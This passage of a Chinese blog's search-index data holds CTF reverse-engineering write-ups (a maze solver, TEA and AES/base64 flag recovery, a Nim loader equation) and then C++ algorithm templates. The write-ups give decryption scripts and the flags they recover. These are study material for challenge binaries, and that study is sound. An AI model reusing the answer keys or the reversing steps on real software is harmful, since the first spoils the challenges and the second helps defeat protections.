offset for j in range(10): fd.seek(addr) fc = u64(fd.read(4).ljust(8,b&#x27;\\x00&#x27;)) if fc &lt;= 0x33765: #整个迷宫函数的长度 fc = fc//0xd3 + i + 1 #oxd3是func度 else: fc = fc - 0x100000000 if fc &gt; -0xd3: fc = i else: if addr+fc &lt; 0x134A: #func1000 fc = 1000 else: fc = fc//0xd3 fc = i+1+fc Map.append(fc) addr += 0xa #case的长度 offset += 0xd3 return MapMap = get_map(fd,offset)def do_bfs(Map): values = [] keys = [] for y in range(1000): for x in range(10): if x == 0: values.append([]) values[y].append(Map[x + y * 10]) for i in range(1000): keys.append(i) result = dict(zip(keys,values)) #两个列表合并成一个字典 result[1000] = &quot;&quot; #print(result) result1 = None q = [(0,&#x27;&#x27;)] check_map = &#123;&#125; while len(q): f = q[0] q = q[1:] if f[0] == 1000: result1 = f[1] break if f[0] not in check_map: check_map[f[0]] = f[1] for i in range(10): if result[f[0]][i] not in check_map: q.append((result[f[0]][i],f[1]+str(i))) return result1result = do_bfs(Map)print(result)result = str(result)times = 999 - len(result)for i in range(times): p.sendline(&quot;11&quot;)for i in range(len(result)): p.sendline(str(int(result[i])+1))","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-DAS","slug":"DAS","permalink":"http://example.com/tags/DAS/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"FFunction","slug":"FFunction","date":"2022-07-18T13:47:05.000Z","updated":"2022-07-18T15:25:52.318Z","comments":true,"path":"2022/07/18/FFunction/","link":"","permalink":"http://example.com/2022/07/18/FFunction/","excerpt":"","text":"ida打开my_plugin.dll 在my_plugin.dll的f函数断下，f函数先将第⼀个参数的数值分成2个word，然后tea加密并与第⼆个参数的值⽐较。 第⼀个参数的值是输⼊经过位置变换然后base64 第二个参数 12[+] Dump 0x1ECA101B060 - 0x1ECA101B0B0 (80 bytes) :[0x5C15754C, 0xD1D781E7, 0x501BF173, 0xCB4DB222, 0x215D61F5, 0x3FCA9EE7, 0x7C76B5C7, 0xC7DD8CB9, 0x990D23FA, 0x0BAB1AD3, 0x8E12C932, 0xD307BAF2, 0xE52DD123, 0xFBB68F2C, 0xBDD853E3, 0x892E1E4E, 0x39DD66FA, 0x87FEEC65, 0x307C5E60, 0x340C6C00] tea解密 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;stdio.h&gt;#include &lt;windows.h&gt;void Decrypt(UINT32 *v, UINT32 *k)&#123; unsigned long n = 32, sum, y = v[0], z = v[1]; unsigned long delta = 0x79B99E37; sum = delta &lt;&lt; 5; while (n-- &gt; 0) &#123; z += ((y &lt;&lt; 4) + k[2]) ^ (y + sum) ^ ((y &gt;&gt; 5) + k[3]); y += ((z &lt;&lt; 4) + k[0]) ^ (z + sum) ^ ((z &gt;&gt; 5) + k[1]); sum -= delta; &#125; v[0] = y; v[1] = z;&#125;int main()&#123; UINT32 key[4] = &#123;0x0BABEC0FE, 0x0DEADBEEF, 0x0FACEB00C, 0xDEADC0DE&#125;; UINT32 enc[21] = &#123;1544910156, 3520561639, 1344008563, 3410866722, 559768053, 1070243559, 2088154567, 3353185465, 2567775226, 195762899, 2383595826, 3540499186, 3844985123, 4223045420, 3185071075, 2301501006, 970811130, 2281630821, 813456992, 873229312, 0&#125;; Decrypt(enc, key); Decrypt(enc + 2, key); Decrypt(enc + 4, key); Decrypt(enc + 6, key); Decrypt(enc + 8, key); Decrypt(enc + 10, key); Decrypt(enc + 12, key); Decrypt(enc + 14, key); Decrypt(enc + 16, key); Decrypt(enc + 18, key); Decrypt(enc + 20, key); for (int i = 0; i &lt; 20 * 4; i++) &#123; printf(&quot;%02x&quot;, ((char *)enc)[i]); &#125; &#125; 再经过base64解码 1234567891011import base64a=&quot;30014006400460044007500230035008600c400a600e6003600c300930016004300340025004400d7007500250086002600f5006300050083007400e3000500a600840055007400970033001600e500a&quot;import reccc=re.findall(&quot;.&#123;2&#125;&quot;,a)ccc=[int(i,16) for i in ccc]fl=&quot;&quot;for index in range(0,len(ccc),2): fl+=(chr(ccc[index]+ccc[index+1]))print(fl[::-1])print(base64.b64decode(fl[::-1]).decode()) 还原 12345678910flag=&quot;f&#125;l!a!gC&#123;_Ehmtp10ww_erre_tFt1u&quot;print(len(flag))f1=&quot;&quot;f2=&quot;&quot;for index in range(len(flag)): if index%2==0: f1+=flag[index] else: f2+=flag[index]print(f1+f2) 1flag&#123;Emp0wer_F1&#125;!!C_ht1w_rettu 再把后部分逆序 1flag&#123;Emp0wer_F1utter_w1th_C!!&#125; 参考dsctf2022 wp - FW_ltlly - 博客园 (cnblogs.com)","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-[dll]","slug":"dll","permalink":"http://example.com/tags/dll/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"catchme","slug":"catchme","date":"2022-07-18T04:17:01.000Z","updated":"2022-07-18T04:42:01.542Z","comments":true,"path":"2022/07/18/catchme/","link":"","permalink":"http://example.com/2022/07/18/catchme/","excerpt":"","text":"主要check函数在native层里面 ida打开so文件,findcrypto找到aes加密，定位到主要加密函数 sub_B2A4 先是一个aes然后是base64 很多的反调试，但是可以直接静态解，aes的key和最后的比较函数都经过异或加密 加密函数datadiv_decode2726420793510661260() 123456789a=[0x4F, 0x1C, 0x36, 0x49, 0x09, 0x3A, 0x3F, 0x07, 0x4D, 0x3D, 0x22, 0x39, 0x00, 0x0A, 0x22, 0x25, 0x06, 0x09, 0x01, 0x20, 0x4A, 0x1B, 0x51, 0x51, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]for i in range(len(a)): a[i]^=0x6C print(chr(a[i]),end=&#x27;&#x27;)print(&#x27; &#x27;)b=[0x24, 0x3C, 0x3D, 0x37, 0x36, 0x21, 0x35, 0x26, 0x3F, 0x37, 0x32, 0x2A, 0x72, 0x72, 0x72, 0x72, 0x53, 0x00]for i in range(len(b)): b[i]^=0x53 print(chr(b[i]),end=&#x27;&#x27;) 比较的字符串：#pZ%eVSk!QNUlfNIjemL&amp;w&#x3D;&#x3D; aes的密钥：wonderfulday!!!! 解密得到flag flag{weu&#x2F;.,iopl}","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-[native] -[android]","slug":"native-android","permalink":"http://example.com/tags/native-android/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"LOADER","slug":"LOADER","date":"2022-07-14T01:21:57.000Z","updated":"2022-07-14T08:33:05.545Z","comments":true,"path":"2022/07/14/LOADER/","link":"","permalink":"http://example.com/2022/07/14/LOADER/","excerpt":"","text":"64位无壳 123456BOOL VirtualProtect( LPVOID lpAddress, // 目标地址起始位置 DWORD dwSize, // 大小 DWORD flNewProtect, // 请求的保护方式 PDWORD lpflOldProtect // 保存老的保护方式); VirtualProtectEx函数可以改变在特定进程中内存区域的保护属性。 独立了一个新的虚拟内存，权限可读可写可执行，作为后面新程序的一个引导，根据后面给的内存地址，将被引导的程序dump下来 无法正常运行，文件头存在问题。（主程序是64位但是文件头 这里修改文件头和可选头的值 主要逻辑为 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214int sub_BF2850()&#123; FILE *v0; // rax __int64 v1; // rax _QWORD *v2; // rsi __int64 v3; // rdi __int64 v4; // rdx __int64 v5; // rbx __m128i *v6; // rax __m128i *v7; // rdi __m128i *v8; // rax unsigned __int64 *v10; // rsi __int64 v11; // rbx __int64 v12; // rcx __m128i *input_1; // rbp __int64 v14; // rdx unsigned __int64 v15; // rdi __int64 v16; // rbx unsigned __int64 *len; // rbp __m128i *v18; // rax __int64 v19; // rcx __m128i *input_2; // rdi __int64 v21; // rdx unsigned __int64 v22; // rsi __int64 v23; // rdi __int64 v24; // rdx unsigned __int64 v25; // rcx __m128i v26; // xmm4 __int64 v27; // rdi __int64 v28; // rdx unsigned __int64 v29; // rcx __m128i v30; // [rsp+20h] [rbp-78h] BYREF __m128i v31; // [rsp+30h] [rbp-68h] BYREF __int64 v32; // [rsp+40h] [rbp-58h] BYREF __int64 v33; // [rsp+48h] [rbp-50h] __m128i v34; // [rsp+50h] [rbp-48h] BYREF __int64 v35; // [rsp+60h] [rbp-38h] BYREF __int64 v36; // [rsp+68h] [rbp-30h] nimRegisterGlobalMarker(sub_BF27A0); nimRegisterGlobalMarker(sub_BF2790); nimRegisterGlobalMarker(sub_BF2780); nimRegisterGlobalMarker(sub_BF2770); nimRegisterGlobalMarker(sub_BF2760); nimRegisterGlobalMarker(sub_BF2750); nimRegisterGlobalMarker(sub_BF2740); nimRegisterGlobalMarker(sub_BF2730); nimRegisterGlobalMarker(sub_BF2720); printf_0(off_BF6DC8, 1i64); v0 = (FILE *)off_BF50C0(0i64); v1 = scanf(v0); v2 = (_QWORD *)v1; if ( v1 ) *(_QWORD *)(v1 - 16) += 8i64; if ( input ) &#123; v3 = *(_QWORD *)(input - 16); v4 = input - 16; *(_QWORD *)(input - 16) = v3 - 8; if ( (unsigned __int64)(v3 - 8) &lt;= 7 ) addZCT__Y66tOYFjgwJ0k4aLz4bc0Q(&amp;qword_C01F80 + 3, v4); &#125; input = (__int64)v2; v5 = 0i64; v6 = sub_BE8FC0(5i64); v7 = v6; if ( !v6 ) &#123; if ( v2 ) sub_BEC420(0i64, -1i64); sub_BEC420(0i64, -1i64); &#125; if ( !v2 ) &#123; if ( !v6-&gt;m128i_i64[0] ) sub_BEC420(0i64, -1i64); sub_BEC420(0i64, -1i64); &#125; do &#123; if ( v6-&gt;m128i_i64[0] &lt;= (unsigned __int64)v5 ) sub_BEC420(v5, v6-&gt;m128i_i64[0] - 1); if ( *v2 &lt;= (unsigned __int64)v5 ) sub_BEC420(v5, *v2 - 1i64); v6[1].m128i_i8[v5] = *((_BYTE *)v2 + v5 + 16); ++v5; &#125; while ( v5 &lt;= 4 ); if ( v6-&gt;m128i_i64[0] != 5 ) goto error; v8 = v6 + 1; if ( v7[1].m128i_i32[0] != &#x27;galf&#x27; ) //判断输入是否为flag goto error; if ( v8-&gt;m128i_i8[4] != &#x27;&#123;&#x27; ) goto error; v10 = (unsigned __int64 *)input; if ( !input || *(_QWORD *)input != 42i64 || *(_BYTE *)(input + 57) != &#x27;&#125;&#x27; )// 判断长度为42位 并且最后一位是&#125; goto error; v11 = 0i64; input_1 = sub_BE8FC0(18i64); if ( !input_1 ) sub_BEC420(0i64, -1i64); do &#123; v14 = input_1-&gt;m128i_i64[0]; if ( input_1-&gt;m128i_i64[0] &lt;= (unsigned __int64)v11 ) sub_BEC420(v11, v14 - 1); // 跳过 v15 = v11 + 5; if ( v11 + 5 &lt; 0 || v15 &lt; v11 ) sub_BE7F70(v12, v14); // 跳过 if ( *v10 &lt;= v15 ) sub_BEC420(v11 + 5, *v10 - 1); // 跳过 input_1[1].m128i_i8[v11++] = *((_BYTE *)v10 + v15 + 16);// 保存我们输入后去除flag&#123;的后18位 &#125; while ( v11 &lt;= 17 ); v16 = 0i64; str2int(input_1, 10i64, &amp;ll_input_1); //将我们的输入转换为了无符号的long long类型的一个数据 len = (unsigned __int64 *)input; v18 = sub_BE8FC0(18i64); input_2 = v18; if ( !v18 ) &#123; if ( len ) sub_BEC420(0i64, -1i64); sub_BEC420(0i64, -1i64); &#125; if ( !len ) &#123; if ( !v18-&gt;m128i_i64[0] ) sub_BEC420(0i64, -1i64); sub_BEC420(23i64, -1i64); &#125; do &#123; v21 = input_2-&gt;m128i_i64[0]; if ( input_2-&gt;m128i_i64[0] &lt;= (unsigned __int64)v16 ) sub_BEC420(v16, v21 - 1); v22 = v16 + 23; if ( v16 + 23 &lt; 0 || v22 &lt; v16 ) sub_BE7F70(v19, v21); if ( *len &lt;= v22 ) sub_BEC420(v16 + 23, *len - 1); input_2[1].m128i_i8[v16++] = *((_BYTE *)len + v22 + 16);// 保存后18位 &#125; while ( v16 &lt;= 17 ); str2int(input_2, 10i64, &amp;ll_input_2); str2int(qword_BF6D80, 10i64, &amp;xmmword_C0C150); str2int(qword_BF6D40, 10i64, &amp;max_num); v31 = _mm_loadu_si128((const __m128i *)&amp;xmmword_C0C150); //大致可以猜测_mm_lodau_si128是将后面的偏移地址处的数据进行加载，那么可以猜测在这个前后应该会有加密部分 v30 = _mm_loadu_si128((const __m128i *)&amp;ll_input_1); if ( !(unsigned __int8)check(&amp;v31, &amp;v30) ) goto error; v31 = _mm_loadu_si128((const __m128i *)&amp;ll_input_1); v30 = _mm_loadu_si128((const __m128i *)&amp;max_num); if ( !(unsigned __int8)check(&amp;v31, &amp;v30) ) goto error; v32 = 0i64; v33 = 0i64; v31 = (__m128i)ll_input_1; v30 = (__m128i)ll_input_1; func_sqr(&amp;v31, &amp;v30, &amp;v32); v23 = v32; if ( v32 ) *(_QWORD *)(v32 - 16) += 8i64; if ( (_QWORD)xmmword_C0C190 ) &#123; v24 = xmmword_C0C190 - 16; v25 = *(_QWORD *)(xmmword_C0C190 - 16) - 8i64; *(_QWORD *)(xmmword_C0C190 - 16) = v25; if ( v25 &lt;= 7 ) addZCT__Y66tOYFjgwJ0k4aLz4bc0Q(&amp;qword_C01F80 + 3, v24); &#125; *(_QWORD *)&amp;xmmword_C0C190 = v23; v34 = 0ui64; BYTE8(xmmword_C0C190) = v33; v31 = (__m128i)ll_input_2; v30 = (__m128i)ll_input_2; func_sqr(&amp;v31, &amp;v30, &amp;v34); v26 = _mm_load_si128(&amp;v34); v35 = 0i64; v36 = 0i64; v31 = v26; func_mul(&amp;v31, 11i64, &amp;v35); v27 = v35; if ( v35 ) *(_QWORD *)(v35 - 16) += 8i64; if ( (_QWORD)xmmword_C0C120 ) &#123; v28 = xmmword_C0C120 - 16; v29 = *(_QWORD *)(xmmword_C0C120 - 16) - 8i64; *(_QWORD *)(xmmword_C0C120 - 16) = v29; if ( v29 &lt;= 7 ) addZCT__Y66tOYFjgwJ0k4aLz4bc0Q(&amp;qword_C01F80 + 3, v28); &#125; *(_QWORD *)&amp;xmmword_C0C120 = v27; v31 = _mm_loadu_si128((const __m128i *)&amp;xmmword_C0C190); BYTE8(xmmword_C0C120) = v36; v30 = _mm_loadu_si128((const __m128i *)&amp;xmmword_C0C120); sub_BF23C0(&amp;v31, &amp;v30, &amp;num_9); str2int(qword_BF6D10, 10i64, &amp;xmmword_C0C180); v31 = _mm_loadu_si128((const __m128i *)&amp;num_9); v30 = _mm_loadu_si128((const __m128i *)&amp;xmmword_C0C180); if ( (unsigned __int8)sub_BF2500(&amp;v31, &amp;v30) ) &#123; qword_BFA660 = 1i64; &#125; else &#123;error: if ( qword_BFA660 != 1 ) return printf_0(off_BF6CC0, 1i64); &#125; return printf_0(win, 1i64);&#125; $$input1^2-11*(input^2)&#x3D;9$$ 大致流程为输入42位的flag。去除flag{}后分为两个18位的数进行上述运算 采用：www.wolframalpha.com/ 进行求解 y是17位前面补上0得到 1flag&#123;118936021352508390035860559716724409&#125;","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"算法-数据结构","slug":"‘算法-数据结构","date":"2022-07-12T00:05:12.000Z","updated":"2022-07-23T12:53:44.312Z","comments":true,"path":"2022/07/12/‘算法-数据结构/","link":"","permalink":"http://example.com/2022/07/12/%E2%80%98%E7%AE%97%E6%B3%95-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/","excerpt":"","text":"链表（数组模拟）new一个结构体效率很低 单链表 邻接表为主（存储数和图） 123456789101112131415161718192021// head存储链表头，e[]存储节点的值，ne[]存储节点的next指针，idx表示当前用到了哪个节点int head, e[N], ne[N], idx;// 初始化void init()&#123; head = -1; idx = 0;&#125;// 在链表头插入一个数avoid insert(int a)&#123; e[idx] = a, ne[idx] = head, head = idx ++ ;&#125;// 将头结点删除，需要保证头结点存在void remove()&#123; head = ne[head];&#125; 双链表 优化某些问题 12345678910111213141516171819202122232425// e[]表示节点的值，l[]表示节点的左指针，r[]表示节点的右指针，idx表示当前用到了哪个节点int e[N], l[N], r[N], idx;// 初始化void init()&#123; //0是左端点，1是右端点 r[0] = 1, l[1] = 0; idx = 2;&#125;// 在节点a的右边插入一个数xvoid insert(int a, int x)&#123; e[idx] = x; l[idx] = a, r[idx] = r[a]; l[r[a]] = idx, r[a] = idx ++ ;&#125;// 删除节点avoid remove(int a)&#123; l[r[a]] = l[a]; r[l[a]] = r[a];&#125; 栈1234567891011121314151617// tt表示栈顶int stk[N], tt = 0;// 向栈顶插入一个数stk[ ++ tt] = x;// 从栈顶弹出一个数tt -- ;// 栈顶的值stk[tt];// 判断栈是否为空if (tt &gt; 0)&#123;&#125; 单调栈 1234567常见模型：找出每个数左边离它最近的比它大/小的数int tt = 0;for (int i = 1; i &lt;= n; i ++ )&#123; while (tt &amp;&amp; check(stk[tt], i)) tt -- ; stk[ ++ tt] = i;&#125; 队列普通队列 1234567891011121314151617// hh 表示队头，tt表示队尾int q[N], hh = 0, tt = -1;// 向队尾插入一个数q[ ++ tt] = x;// 从队头弹出一个数hh ++ ;// 队头的值q[hh];// 判断队列是否为空if (hh &lt;= tt)&#123;&#125; 循环队列 12345678910111213141516171819// hh 表示队头，tt表示队尾的后一个位置int q[N], hh = 0, tt = 0;// 向队尾插入一个数q[tt ++ ] = x;if (tt == N) tt = 0;// 从队头弹出一个数hh ++ ;if (hh == N) hh = 0;// 队头的值q[hh];// 判断队列是否为空if (hh != tt)&#123;&#125; 单调队列 12345678常见模型：找出滑动窗口中的最大值/最小值int hh = 0, tt = -1;for (int i = 0; i &lt; n; i ++ )&#123; while (hh &lt;= tt &amp;&amp; check_out(q[hh])) hh ++ ; // 判断队头是否滑出窗口 while (hh &lt;= tt &amp;&amp; check(q[tt], i)) tt -- ; q[ ++ tt] = i;&#125; KMP字符串匹配算法核心思想：在每次失配时，不是把p串往后移一位，而是把p串往后移动至下一次可以和前面部分匹配的位置，这样就可以跳过大多数的失配步骤。而每次p串移动的步数就是通过查找next[ ]数组确定的。 “非平凡前缀”：指除了最后一个字符以外，一个字符串的全部头部组合。“非平凡后缀”：指除了第一个字符以外，一个字符串的全部尾部组合（简称前后缀） next数组的含义：对next[ j ] ，是p[ 1, j ]串中前缀和后缀相同的最大长度（部分匹配值），即 p[ 1, next[ j ] ] &#x3D; p[ j - next[ j ] + 1, j ]，也就是最长公共长度。（起始位1）next数组的求法是通过模板串自己与自己进行匹配操作得出来的 对 p &#x3D; “abcab” ​ p a b c a b下标 1 2 3 4 5next[ ] 0 0 0 1 2 12345678910111213141516171819202122232425// s[]是长文本，p[]是模式串，n是s的长度，m是p的长度求模式串的Next数组：for (int i = 2, j = 0; i &lt;= m; i ++ )&#123; while (j &amp;&amp; p[i] != p[j + 1]) j = ne[j]; if (p[i] == p[j + 1]) j ++ ; ne[i] = j;&#125;// 匹配for (int i = 1, j = 0; i &lt;= n; i ++ )&#123; while (j &amp;&amp; s[i] != p[j + 1]) j = ne[j]; //如果j有对应p串的元素， 且s[i] != p[j+1], 则失配， 移动p串 //用while是由于移动后可能仍然失配，所以要继续移动直到匹配或整个p串移到后面（j = 0) if (s[i] == p[j + 1]) j ++ ; //当前元素匹配，j移向p串下一位 if (j == m) &#123; j = ne[j]; // 匹配成功后的逻辑 &#125;&#125; Tire树123456789101112131415161718192021222324252627282930int son[N][26], cnt[N], idx;//idx意义同本身的值和指向下一个结点的指针// 0号点既是根节点，又是空节点// son[][]存储树中每个节点的子节点// cnt[]存储以每个节点结尾的单词数量// 插入一个字符串void insert(char *str)&#123; int p = 0; for (int i = 0; str[i]; i ++ ) &#123; int u = str[i] - &#x27;a&#x27;; if (!son[p][u]) son[p][u] = ++ idx; p = son[p][u]; &#125; cnt[p] ++ ;&#125;// 查询字符串出现的次数int query(char *str)&#123; int p = 0; for (int i = 0; str[i]; i ++ ) &#123; int u = str[i] - &#x27;a&#x27;; if (!son[p][u]) return 0; p = son[p][u]; &#125; return cnt[p];&#125; 并查集1.将两个集合合并2.询问两个元素是否在一个集合当中基本原理:每个集合用一棵树来表示。树根的编号就是整个集合的编号。每个节点存储它的父节点，p[x]表示x的父节点 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071(1)朴素并查集： int p[N]; //存储每个点的祖宗节点 // 返回x的祖宗节点 int find(int x) &#123;//返回x的祖先节点 + 路径压缩 //祖先节点的父节点是自己本身 if (p[x] != x) //将x的父亲置为x父亲的祖先节点,实现路径的压缩 p[x] = find(p[x]); return p[x]; &#125; // 初始化，假定节点编号是1~n for (int i = 1; i &lt;= n; i ++ ) p[i] = i; //就是将当前数据的父节点指向自己 // 合并a和b所在的两个集合： p[find(a)] = find(b);(2)维护size的并查集： int p[N], size[N]; //p[]存储每个点的祖宗节点, size[]只有祖宗节点的有意义，表示祖宗节点所在集合中的点的数量 // 返回x的祖宗节点 int find(int x) &#123; if (p[x] != x) p[x] = find(p[x]); return p[x]; &#125; // 初始化，假定节点编号是1~n for (int i = 1; i &lt;= n; i ++ ) &#123; p[i] = i; size[i] = 1; &#125; // 合并a和b所在的两个集合： size[find(b)] += size[find(a)]; p[find(a)] = find(b);(3)维护到祖宗节点距离的并查集： int p[N], d[N]; //p[]存储每个点的祖宗节点, d[x]存储x到p[x]的距离 // 返回x的祖宗节点 int find(int x) &#123; if (p[x] != x) &#123; int u = find(p[x]); d[x] += d[p[x]]; p[x] = u; &#125; return p[x]; &#125; // 初始化，假定节点编号是1~n for (int i = 1; i &lt;= n; i ++ ) &#123; p[i] = i; d[i] = 0; &#125; // 合并a和b所在的两个集合： p[find(a)] = find(b); d[find(a)] = distance; // 根据具体问题，初始化find(a)的偏移量 堆堆是一种完全二叉树，复习一下完全二叉树的定义，完全二叉树的形式是指除了最后一层之外，其他所有层的结点都是满的，而最后一层的所有结点都靠左边。教材上定义如下: 若设二叉树的深度为h，除第 h 层外，其它各层 (1～h-1) 的结点数都达到最大个数，第 h 层所有的结点都连续集中在最左边，这就是完全二叉树。 如下图所示，就是一种典型的完全二叉树: 123456789101112131415161718192021222324252627282930313233343536// h[N]存储堆中的值, h[1]是堆顶，x的左儿子是2x, 右儿子是2x + 1// ph[k]存储第k个插入的点在堆中的位置// hp[k]存储堆中下标是k的点是第几个插入的int h[N], ph[N], hp[N], size;// 交换两个点，及其映射关系void heap_swap(int a, int b)&#123; swap(ph[hp[a]],ph[hp[b]]); swap(hp[a], hp[b]); swap(h[a], h[b]);&#125;void down(int u)&#123; int t = u; if (u * 2 &lt;= size &amp;&amp; h[u * 2] &lt; h[t]) t = u * 2; if (u * 2 + 1 &lt;= size &amp;&amp; h[u * 2 + 1] &lt; h[t]) t = u * 2 + 1 ; if (u != t) &#123; heap_swap(u, t); down(t); &#125;&#125;void up(int u)&#123; while (u / 2 &amp;&amp; h[u] &lt; h[u / 2]) &#123; heap_swap(u, u / 2); u &gt;&gt;= 1; &#125;&#125;// O(n)建堆for (int i = n / 2; i; i -- ) down(i); 一般哈希(1) 拉链法 int h[N], e[N], ne[N], idx; // 向哈希表中插入一个数 void insert(int x) &#123; int k = (x % N + N) % N; e[idx] = x; ne[idx] = h[k]; h[k] = idx ++ ; &#125; // 在哈希表中查询某个数是否存在 bool find(int x) &#123; int k = (x % N + N) % N; for (int i = h[k]; i != -1; i = ne[i]) if (e[i] == x) return true; return false; &#125; (2) 开放寻址法 int h[N]; 1234567891011// 如果x在哈希表中，返回x的下标；如果x不在哈希表中，返回x应该插入的位置int find(int x)&#123; int t = (x % N + N) % N; while (h[t] != null &amp;&amp; h[t] != x) &#123; t ++ ; if (t == N) t = 0; &#125; return t;&#125; 字符串哈希核心思想：将字符串看成P进制数，P的经验值是131或13331，取这两个值的冲突概率低小技巧：取模的数用2^64，这样直接用unsigned long long存储，溢出的结果就是取模的结果 12345678910111213141516typedef unsigned long long ULL;ULL h[N], p[N]; // h[k]存储字符串前k个字母的哈希值, p[k]存储 P^k mod 2^64// 初始化p[0] = 1;for (int i = 1; i &lt;= n; i ++ )&#123; h[i] = h[i - 1] * P + str[i]; p[i] = p[i - 1] * P;&#125;// 计算子串 str[l ~ r] 的哈希值ULL get(int l, int r)&#123; return h[r] - h[l - 1] * p[r - l + 1];&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"keywords":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}]},{"title":"算法基础","slug":"算法基础-快排","date":"2022-07-06T16:00:00.000Z","updated":"2022-07-26T06:55:26.207Z","comments":true,"path":"2022/07/07/算法基础-快排/","link":"","permalink":"http://example.com/2022/07/07/%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80-%E5%BF%AB%E6%8E%92/","excerpt":"","text":"STL123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100vector, 变长数组，倍增的思想 size() 返回元素个数 empty() 返回是否为空 clear() 清空 front()/back() push_back()/pop_back() begin()/end() [] 支持比较运算，按字典序pair&lt;int, int&gt; first, 第一个元素 second, 第二个元素 支持比较运算，以first为第一关键字，以second为第二关键字（字典序）string，字符串 size()/length() 返回字符串长度 empty() clear() substr(起始下标，(子串长度)) 返回子串 c_str() 返回字符串所在字符数组的起始地址queue, 队列 size() empty() push() 向队尾插入一个元素 front() 返回队头元素 back() 返回队尾元素 pop() 弹出队头元素priority_queue, 优先队列，默认是大根堆 size() empty() push() 插入一个元素 top() 返回堆顶元素 pop() 弹出堆顶元素 定义成小根堆的方式：priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; q;stack, 栈 size() empty() push() 向栈顶插入一个元素 top() 返回栈顶元素 pop() 弹出栈顶元素deque, 双端队列 size() empty() clear() front()/back() push_back()/pop_back() push_front()/pop_front() begin()/end() []set, map, multiset, multimap, 基于平衡二叉树（红黑树），动态维护有序序列 size() empty() clear() begin()/end() ++, -- 返回前驱和后继，时间复杂度 O(logn) set/multiset insert() 插入一个数 find() 查找一个数 count() 返回某一个数的个数 erase() (1) 输入是一个数x，删除所有x O(k + logn) (2) 输入一个迭代器，删除这个迭代器 lower_bound()/upper_bound() lower_bound(x) 返回大于等于x的最小的数的迭代器 upper_bound(x) 返回大于x的最小的数的迭代器 map/multimap insert() 插入的数是一个pair erase() 输入的参数是pair或者迭代器 find() [] 注意multimap不支持此操作。 时间复杂度是 O(logn) lower_bound()/upper_bound()unordered_set, unordered_map, unordered_multiset, unordered_multimap, 哈希表 和上面类似，增删改查的时间复杂度是 O(1) 不支持 lower_bound()/upper_bound()， 迭代器的++，--bitset, 圧位 bitset&lt;10000&gt; s; ~, &amp;, |, ^ &gt;&gt;, &lt;&lt; ==, != [] count() 返回有多少个1 any() 判断是否至少有一个1 none() 判断是否全为0 set() 把所有位置成1 set(k, v) 将第k位变成v reset() 把所有位变成0 flip() 等价于~ flip(k) 把第k位取反 快排模板： 12345678910111213141516void quick_sort(int q[], int l, int r)&#123; //递归的终止情况 if(l &gt;= r) return; //第一步：分成子问题 int i = l - 1, j = r + 1, x = q[l + r &gt;&gt; 1]; while(i &lt; j) &#123; do i++; while(q[i] &lt; x); do j--; while(q[j] &gt; x); if(i &lt; j) swap(q[i], q[j]); &#125; //第二步：递归处理子问题 quick_sort(q, l, j), quick_sort(q, j + 1, r); //第三步：子问题合并.快排这一步不需要操作，但归并排序的核心在这一步骤&#125; 例题给定你一个长度为 nn 的整数数列。 请你使用快速排序对这个数列按照从小到大进行排序。 并将排好序的数列按顺序输出。 输入格式输入共两行，第一行包含整数 nn。 第二行包含 nn 个整数（所有整数均在 1∼1091∼109 范围内），表示整个数列。 输出格式输出共一行，包含 nn 个整数，表示排好序的数列。 数据范围1≤n≤1000001≤n≤100000 输入样例：1253 1 2 4 5 输出样例：11 2 3 4 5 解题：1234567891011121314151617181920212223242526272829303132#include&lt;iostream&gt;using namespace std;const int N=1000010;int q[N];void quick_sort(int q[],int l,int r)&#123; if (l&gt;=r)return; int x=q[l+r&gt;&gt;1],i=l-1,j=r+1; while(i&lt;j) &#123; do i++;while(q[i]&lt;x); do j--;while(q[j]&gt;x); if(i&lt;j) swap(q[i],q[j]); &#125; quick_sort(q,l,j); quick_sort(q,j+1,r);&#125;int main()&#123; int n; scanf(&quot;%d&quot;,&amp;n); //scanf比cin速度更快 for (int i=0;i&lt;n;i++) scanf(&quot;%d&quot;,&amp;q[i]); quick_sort (q,0,n-1); for (int i=0;i&lt;n;i++) printf(&quot;%d &quot;,q[i]); return 0;&#125; 归并排序模板 123456789101112131415161718192021void merge_sort(int q[], int l, int r)&#123; //递归的终止情况 if(l &gt;= r) return; //第一步：分成子问题 int mid = l + r &gt;&gt; 1; //第二步：递归处理子问题 merge_sort(q, l, mid ), merge_sort(q, mid + 1, r); //第三步：合并子问题 int k = 0, i = l, j = mid + 1, tmp[r - l + 1]; while(i &lt;= mid &amp;&amp; j &lt;= r) if(q[i] &lt;= q[j]) tmp[k++] = q[i++]; else tmp[k++] = q[j++]; while(i &lt;= mid) tmp[k++] = q[i++]; while(j &lt;= r) tmp[k++] = q[j++]; 